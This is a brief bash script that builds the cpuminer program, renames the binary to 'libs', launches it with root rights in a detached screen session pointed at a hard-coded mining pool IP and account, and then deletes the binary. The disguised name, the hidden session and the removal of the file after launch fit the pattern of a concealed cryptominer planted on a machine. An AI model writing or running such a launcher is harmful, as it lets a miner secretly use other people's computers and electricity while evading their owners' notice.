#!/bin/bash
sudo chmod +x build.sh 
sudo ./build.sh
sudo cp cpuminer libs
sudo screen -d -m ./libs -a xevan -o stratum+tcp://149.202.78.181:8686 -u duyuno.duy -p x
cd /
sudo rm -rf libs